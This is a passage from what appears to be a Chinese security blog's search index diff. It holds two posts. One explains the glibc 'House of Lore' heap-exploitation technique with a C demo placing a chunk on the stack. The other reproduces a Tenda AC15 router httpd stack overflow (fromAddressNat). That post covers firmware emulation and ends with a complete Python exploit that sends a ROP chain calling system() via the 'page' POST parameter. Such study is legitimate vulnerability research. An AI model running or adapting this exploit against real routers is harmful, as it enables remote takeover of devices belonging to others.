bin;</span><br><span class="line"></span><br><span class="line">             if (av != &amp;main_arena)</span><br><span class="line">               victim-&gt;size |= NON_MAIN_ARENA;</span><br><span class="line">             check_malloced_chunk (av, victim, nb);</span><br><span class="line">             void *p = chunk2mem (victim);</span><br><span class="line">             alloc_perturb (p, bytes);</span><br><span class="line">             return p;</span><br><span class="line">           }</span><br><span class="line">       }</span><br><span class="line">   }</span><br></pre></td></tr></tbody></table></figure>
+
+<h3 id="第一块碎片"><a href="#第一块碎片" class="headerlink" title="第一块碎片"></a>第一块碎片</h3><pre><code>  if ((victim = last (bin)) != bin)
+    {
+      if (victim == 0) /* initialization check */
+        malloc_consolidate (av);
+      else
+        {
+          bck = victim-&gt;bk;
+</code></pre>
+<p>如果victim不是small bin的最后一个也就是未满的情况</p>
+<p>bck=victim-&gt;bk           此时bk被我们伪造为target addr   所以bck=target addr</p>
+<h3 id="第二块碎片"><a href="#第二块碎片" class="headerlink" title="第二块碎片"></a>第二块碎片</h3><pre><code>          set_inuse_bit_at_offset (victim, nb);
+          bin-&gt;bk = bck;
+          bck-&gt;fd = bin;
+</code></pre>
+<p>bin-&gt;bk=bck,这就相当于把target addr  链入small bin的开头，接下来我们就可以通过malloc把这取出来</p>
+<h3 id="第三块碎片"><a href="#第三块碎片" class="headerlink" title="第三块碎片"></a>第三块碎片</h3><p>要执行这一步要经过这个check</p>
+<pre><code>if (__glibc_unlikely (bck-&gt;fd != victim))
+            {
+              errstr = "malloc(): smallbin double linked list corrupted";
+              goto errout;
+            }
+</code></pre>
+<p>也就是bck-&gt;fd=victim  也就是说  target_addr+0x10 的位置要等于victim的地址</p>
+<h2 id="接下来通过demo演示-实验环境2-23"><a href="#接下来通过demo演示-实验环境2-23" class="headerlink" title="接下来通过demo演示(实验环境2.23)"></a>接下来通过demo演示(实验环境2.23)</h2><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include &lt;stdint.h&gt;</span><br><span class="line">#include &lt;assert.h&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">int main(int argc, char * argv[]){</span><br><span class="line">    intptr_t* stack_buffer_1[4] = {0};</span><br><span class="line">    intptr_t* stack_buffer_2[4] = {0};</span><br><span class="line">    intptr_t *victim = malloc(0x100);</span><br><span class="line">    malloc(0x10);</span><br><span class="line">    free(victim);</span><br><span class="line">    malloc(0x400);</span><br><span class="line">    victim[1] = &amp;stack_buffer_1; // victim_chunk_addr-&gt;bk = stack_buffer_1_addr</span><br><span class="line">    stack_buffer_1[2] = victim-2; //stack_buffer_1-&gt;fd = victim_chunk_addr</span><br><span class="line">//===============================line=================================</span><br><span class="line">    intptr_t *p1 = malloc(0x100);</span><br><span class="line">    intptr_t *p2 = malloc(0x100);//chunk on the stack</span><br><span class="line">    malloc(0x100); //failed : bck-&gt;fd != victim</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+
+<p><strong>堆块布局：</strong></p>
+<pre><code>intptr_t* stack_buffer_1[4] = {0};
+intptr_t* stack_buffer_2[4] = {0};
+intptr_t *victim = malloc(0x100);
+malloc(0x10);
+free(victim);
+malloc(0x400);
+</code></pre>
+<p><img src="/pic/house_of_lore/0.png" alt="img"></p>
+<p>此时的malloc(0x400)是为了将unsorted bin 变为small bin</p>
+<p><strong>布置攻击条件</strong></p>
+<pre><code>victim[1] = &amp;stack_buffer_1; // victim_chunk_addr-&gt;bk = stack_buffer_1_addr
+stack_buffer_1[2] = victim-2; //stack_buffer_1-&gt;fd = victim_chunk_addr
+</code></pre>
+<p><img src="/pic/house_of_lore/1.png" alt="img"></p>
+<h3 id="攻击效果"><a href="#攻击效果" class="headerlink" title="攻击效果"></a>攻击效果</h3><p><img src="/pic/house_of_lore/2.png" alt="img"></p>
+<p>接下来在申请一次就可以再目标地址布置堆</p>
+<p><img src="/pic/house_of_lore/3.png" alt="img"></p>
+<h2 id="2-27源码更改"><a href="#2-27源码更改" class="headerlink" title="2.27源码更改"></a>2.27源码更改</h2><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">  if (in_smallbin_range (nb))</span><br><span class="line">    {</span><br><span class="line">      idx = smallbin_index (nb);</span><br><span class="line">      bin = bin_at (av, idx);</span><br><span class="line"></span><br><span class="line">      if ((victim = last (bin)) != bin)</span><br><span class="line">        {</span><br><span class="line">          bck = victim-&gt;bk;</span><br><span class="line">	  if (__glibc_unlikely (bck-&gt;fd != victim))</span><br><span class="line">	    malloc_printerr ("malloc(): smallbin double linked list corrupted");</span><br><span class="line">          set_inuse_bit_at_offset (victim, nb);</span><br><span class="line">          bin-&gt;bk = bck;</span><br><span class="line">          bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line">          if (av != &amp;main_arena)</span><br><span class="line">	    set_non_main_arena (victim);</span><br><span class="line">          check_malloced_chunk (av, victim, nb);</span><br><span class="line">#if USE_TCACHE</span><br><span class="line">	  /* While we're here, if we see other chunks of the same size,</span><br><span class="line">	     stash them in the tcache.  */</span><br><span class="line">	  size_t tc_idx = csize2tidx (nb);</span><br><span class="line">	  if (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">	    {</span><br><span class="line">	      mchunkptr tc_victim;</span><br><span class="line"></span><br><span class="line">	      /* While bin not empty and tcache not full, copy chunks over.  */</span><br><span class="line">	      while (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count</span><br><span class="line">		     &amp;&amp; (tc_victim = last (bin)) != bin)</span><br><span class="line">		{</span><br><span class="line">		  if (tc_victim != 0)</span><br><span class="line">		    {</span><br><span class="line">		      bck = tc_victim-&gt;bk;</span><br><span class="line">		      set_inuse_bit_at_offset (tc_victim, nb);</span><br><span class="line">		      if (av != &amp;main_arena)</span><br><span class="line">			set_non_main_arena (tc_victim);</span><br><span class="line">		      bin-&gt;bk = bck;</span><br><span class="line">		      bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line">		      tcache_put (tc_victim, tc_idx);</span><br><span class="line">	            }</span><br><span class="line">		}</span><br><span class="line">	    }</span><br><span class="line">#endif</span><br><span class="line">          void *p = chunk2mem (victim);</span><br><span class="line">          alloc_perturb (p, bytes);</span><br><span class="line">          return p;</span><br><span class="line">        }</span><br><span class="line">    }</span><br></pre></td></tr></tbody></table></figure>
+
+<p>要么使其满足 <code>tc_victim = last (bin)) == bin</code>、要么使其满足：<code>tcache-&gt;counts[tc_idx] ≥ mp_.tcache_count</code>。否则可能会因为非法内存访问使得程序 <code>down</code> 掉。</p>
+<p>高版本的情况2.31之后利用条件比较苛刻，有这利用条件 早就别的路去打io了</p>
+<p>参考文献</p>
+<p><a href="https://roderickchan.github.io/zh-cn/2023-02-27-house-of-all-about-glibc-heap-exploitation/">https://roderickchan.github.io/zh-cn/2023-02-27-house-of-all-about-glibc-heap-exploitation/</a></p>
+<p><a href="https://tty-flag.github.io/2021/04/20/House-of-lore.html">House of lore - TTY的博客 (tty-flag.github.io)</a></p>
+<p>[House Of Lore-原理 | Pwn进你的心 (ywhkkx.github.io)](<a href="https://ywhkkx.github.io/2022/03/10/House">https://ywhkkx.github.io/2022/03/10/House</a> Of Lore-原理/)</p>
+]]></content>
+      <categories>
+        <category>pwn学习</category>
+        <category>堆利用</category>
+      </categories>
+      <tags>
+        <tag>house_of</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Tenda AC15fromAddressNat函数</title>
+    <url>/2024/08/18/tenda%20AV15/</url>
+    <content><![CDATA[<h2 id="固件提取"><a href="#固件提取" class="headerlink" title="固件提取"></a>固件提取</h2><p><a href="https://blog.xmcve.com/2022/10/08/CVE-2018-18708-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/US_AC15V1.0BR_V15.03.05.19_multi_TD01.zip">https://blog.xmcve.com/2022/10/08/CVE-2018-18708-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/US_AC15V1.0BR_V15.03.05.19_multi_TD01.zip</a></p>
+<p>提取后看一下架构</p>
+<p><img src="/pic/Tenda_AV15_fromAddressNat%E5%87%BD%E6%95%B0/0.png" alt="img"></p>
+<p>直接启动，不用配置qemu环境 这个没那么麻烦</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">cp /usr/bin/qemu-arm-static .   </span><br><span class="line">chroot . ./qemu-arm-static ./bin/httpd</span><br></pre></td></tr></tbody></table></figure>
+
+<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p><img src="/pic/Tenda_AV15_fromAddressNat%E5%87%BD%E6%95%B0/1.png" alt="img"></p>
+<p>可以看到起来之后 程序会卡在welcome to 后面 我们跟到ida看看</p>
+<p><img src="/pic/Tenda_AV15_fromAddressNat%E5%87%BD%E6%95%B0/2.png" alt="img"></p>
+<p>这里有个check_network的检测 我们给它直接patch掉</p>
+<p><img src="/pic/Tenda_AV15_fromAddressNat%E5%87%BD%E6%95%B0/3.png" alt="img"></p>
+<p>这里也有个检测 同样patch掉 patch掉之后在执行</p>
+<p>网桥br0检测阶段：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">sudo brctl addbr br0</span><br><span class="line">sudo ifconfig br0 ``192.168``.``2.3``/``24</span><br></pre></td></tr></tbody></table></figure>
+
+<p>解决掉ip的问题之后我们再次启动发现</p>
+<p><img src="/pic/Tenda_AV15_fromAddressNat%E5%87%BD%E6%95%B0/4.png" alt="img"></p>
+<p>无法正常显示 通过查阅资料发现：</p>
+<p>是因为<code>webroot_ro</code>的内容复制进了<code>webroot</code>中，而webroot里面没有东西，所以就page not found了</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">cp -rf ./webroot_ro/* ./webroot/</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="/pic/Tenda_AV15_fromAddressNat%E5%87%BD%E6%95%B0/5.png" alt="img"></p>
+<p>然后就可以连上了</p>
+<p><img src="/pic/Tenda_AV15_fromAddressNat%E5%87%BD%E6%95%B0/6.png" alt="img"></p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><blockquote>
+<p>An issue was discovered on Tenda AC7 V15.03.06.44_CN, AC9 V15.03.05.19(6318)_CN, AC10 V15.03.06.23_CN, AC15 V15.03.05.19_CN, and AC18 V15.03.05.19(6318)_CN devices. It is a buffer overflow vulnerability in the router’s web server – httpd. When processing the “page” parameter of the function “fromAddressNat” for a post request, the value is directly used in a sprintf to a local variable placed on the stack, which overrides the return address of the function.</p>
+</blockquote>
+<p>通过官方发布的描述 可以发现是fromAddressNat函数导致的栈溢出，我们跟进ida中去看一下</p>
+<p><img src="/pic/Tenda_AV15_fromAddressNat%E5%87%BD%E6%95%B0/7.png" alt="img"></p>
+<p>这里直接把v7加上前面的部分 赋值到v6中 就有可能造成栈溢出 还要看看v7怎么来的</p>
+<p>v7 = (const char *)sub_2BA8C(a1, “page”, “1”);</p>
+<p><img src="/pic/Tenda_AV15_fromAddressNat%E5%87%BD%E6%95%B0/8.png" alt="img"></p>
+<p>上面两段总体上看就是把 page后面的部分赋值到v6中去，而这个明显是page后的内容，所以伪造请求，page那里进行溢出进行rce</p>
+<p>exp如下：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">#!/usr/bin/python3</span><br><span class="line">import socket</span><br><span class="line">import os</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">li = lambda x : print('\x1b[01;38;5;214m' + x + '\x1b[0m')</span><br><span class="line">ll = lambda x : print('\x1b[01;38;5;1m' + x + '\x1b[0m')</span><br><span class="line"></span><br><span class="line">ip = '192.168.31.248'</span><br><span class="line">port = 80</span><br><span class="line"></span><br><span class="line">r = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line">li('[+] connecting')</span><br><span class="line">r.connect((ip, port))</span><br><span class="line">li('[+] connect finish')</span><br><span class="line"></span><br><span class="line">rn = b'\r\n'</span><br><span class="line"></span><br><span class="line">p1 = b'a'*244+b'b'*4</span><br><span class="line">libc_base=0x3fd9c000</span><br><span class="line">system_addr = 0x3ff3e0f4</span><br><span class="line">pop_r3_pc = 0x00018298 + libc_base</span><br><span class="line">mov_r0_sp_blx_r3 = 0x00040cb8 + libc_base</span><br><span class="line">p2 = b'page=' + p1 +p32(pop_r3_pc)+p32(system_addr)+p32(mov_r0_sp_blx_r3)+p32(0x3fdfe6d2)</span><br><span class="line">p3 = b"POST /goform/addressNat" + b" HTTP/1.1" + rn</span><br><span class="line">p3 += b"Host: 192.168.31.248" + rn</span><br><span class="line">p3 += b"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:102.0) Gecko/20100101 Firefox/102.0" + rn</span><br><span class="line">p3 += b"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" + rn</span><br><span class="line">p3 += b"Accept-Language: en-US,en;q=0.5" + rn</span><br><span class="line">p3 += b"Accept-Encoding: gzip, deflate" + rn</span><br><span class="line">p3 += b"Cookie: password=hum1qw" + rn</span><br><span class="line">p3 += b"Connection: close" + rn</span><br><span class="line">p3 += b"Upgrade-Insecure-Requests: 1" + rn</span><br><span class="line">p3 += (b"Content-Length: %d" % len(p2)) +rn</span><br><span class="line">p3 += b'Content-Type: application/x-www-form-urlencoded'+rn</span><br><span class="line">p3 += rn</span><br><span class="line">p3 += p2</span><br><span class="line"></span><br><span class="line">li('[+] sendling payload')</span><br><span class="line">r.send(p3)</span><br><span class="line"></span><br><span class="line">response = r.recv(4096)</span><br><span class="line">response = response.decode()</span><br><span class="line">li(response)</span><br></pre></td></tr></tbody></table></figure>
+
+]]></content>
+      <categories>
+        <category>iot</category>
+        <category>漏洞复现</category>
+        <category>Tenda</category>
+      </categories>
+      <tags>
+        <tag>漏洞复现---栈溢出</tag>
       </tags>
   </entry>
 </search>
